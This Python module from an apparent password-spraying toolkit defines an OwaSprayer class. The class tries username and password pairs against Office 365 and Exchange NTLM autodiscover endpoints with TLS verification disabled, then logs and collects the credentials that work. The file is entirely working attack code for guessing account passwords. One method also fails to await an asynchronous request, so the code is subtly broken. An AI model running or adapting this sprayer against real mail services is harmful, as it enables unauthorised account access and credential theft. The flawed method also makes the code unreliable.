import ssl
import httpx
import asyncio
import logging
import functools
from typing import List, Union
from urllib.parse import urlparse
from httpx_ntlm import HttpNtlmAuth
from sprayingtoolkit.models import HostingLocation
from sprayingtoolkit.base import BaseSprayer

log = logging.getLogger("atomizer.modules.owa.sprayer")


class OwaSprayer(BaseSprayer):
    def __init__(self, target, hosting_location, autodiscover_url, interval):
        self.target = target
        self.hosting_location = hosting_location
        self.autodiscover_url = autodiscover_url
        self.interval = interval
        self.valid_accounts = set()
        self.headers = {"Content-Type": "text/xml"}
        self.client = httpx.AsyncClient(
            verify=False, trust_env=True, http2=True, headers=self.headers
        )

    async def shutdown(self):
        await self.client.aclose()

    async def auth_o365(self, username, password):
        r = await self.client.get(
            "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml",
            auth=(username, password),
        )
        if r.status_code == 200:
            log.info(f"Found credentials: {username}:{password}")
            self.valid_accounts.add(f"{username}:{password}")
        elif r.status_code == 456:
            log.info(
                f"Found credentials: {username}:{password} - however cannot log in: please check manually (2FA, account locked...)"
            )
            self.valid_accounts.add(f"{username}:{password} - check manually")
        else:
            log.info(
                f"Authentication failed: {username}:{password} (Invalid credentials)"
            )

    async def auth(self, username, password):
        r = self.client.get(
            self.autodiscover_url, auth=HttpNtlmAuth(username, password)
        )
        if r.status_code == 200:
            log.info(f"Found credentials: {username}:{password}")
            self.valid_accounts.add(f"{username}:{password}")
        else:
            log.info(
                f"Authentication failed: {username}:{password} (Invalid credentials)"
            )
